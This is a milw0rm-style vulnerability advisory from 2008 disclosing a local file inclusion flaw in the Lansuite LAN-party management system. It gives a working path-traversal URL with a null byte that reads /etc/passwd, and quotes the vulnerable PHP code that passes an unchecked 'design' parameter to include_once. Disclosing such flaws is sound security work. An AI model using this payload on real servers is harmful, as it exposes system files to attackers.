@@ -1,0 +1,50 @@
+
+  :::::::-.   ...    ::::::.    :::.
+   ;;,   `';, ;;     ;;;`;;;;,  `;;;
+   `[[     [[[['     [[[  [[[[[. '[[
+    $$,    $$$$      $$$  $$$ "Y$c$$
+    888_,o8P'88    .d888  888    Y88
+    MMMMP"`   "YmmMMMM""  MMM     YM
+
+   [ Discovered by dun \ dun[at]strcpy.pl ]
+
+ ##########################################################################
+ #  [ lansuite <= 3.4 beta r1363 ]   Local File Inclusion Vulnerability   #
+ ##########################################################################
+ #
+ # Script: "Lansuite - Webbased LAN-Party Management System"
+ #
+ # Script site: http://lansuite.orgapage.de
+ # Download: http://sourceforge.net/project/showfiles.php?group_id=105885
+ #
+ # Vuln: 
+ # http://site.com/[lansuite-3.4_beta_r1363]/index.php?design=../../../../../../../../../../etc/passwd%00
+ #     
+ #
+ # Bug: ./lansuite-3.4_beta_r1363/index.php (lines: 243-254)
+ #
+ # ...
+ #	if (!$auth["design"]) $auth["design"] = "simple";
+ #	if (!file_exists("design/{$auth["design"]}/templates/index.php")) $auth["design"] = "simple";
+ #	$_SESSION["auth"]["design"] = $auth["design"];
+ #	if ($_GET['design'] and $_GET['design'] != 'popup' and $_GET['design'] != 'base') $auth['design'] = $_GET['design'];      // [1]
+ #
+ #	// Statistic Functions (for generating server- and usage-statistics)
+ #	if ($db->success)	$stats = new stats();
+ #
+ #	// Boxes
+ #	if (!$IsAboutToInstall and !$_GET['contentonly'] and $_GET['design'] != 'base') include_once("modules/boxes/class_boxes.php");
+ #
+ #	if ($_GET['design'] != 'base') include_once('design/'. $auth['design'] .'/templates/index.php'); 			  // [2] LFI
+ # ... 			    
+ #
+ #
+ ###############################################
+ # Greetz: D3m0n_DE * str0ke * and otherz..
+ ###############################################
+
+ [ dun / 2008 ] 
+
+*******************************************************************************************
+
+# milw0rm.com [2008-09-25]
